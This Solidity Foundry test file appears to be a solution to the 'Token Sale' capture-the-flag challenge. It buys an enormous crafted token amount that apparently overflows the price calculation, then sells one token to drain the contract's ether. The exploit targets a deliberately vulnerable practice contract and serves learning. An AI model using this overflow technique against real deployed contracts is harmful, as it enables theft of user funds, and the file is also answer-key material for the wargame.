// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { Test } from "forge-std/Test.sol";
import { TokenSaleChallenge } from "../src/challenges/10_TokenSale/TokenSaleChallenge.sol";
import { TokenSaleChallengeFactory } from "../src/challenges/10_TokenSale/TokenSaleChallengeFactory.sol";

contract TokenSaleTest is Test {
    TokenSaleChallenge public challenge;

    function setUp() public {
        TokenSaleChallengeFactory factory = new TokenSaleChallengeFactory();
        challenge = factory.createChallenge{ value: 1 ether }();
    }

    function test() public {
        challenge.buy(0x0001000000000000000000000000000000000000000000000000000000000000);
        challenge.sell(1);

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}
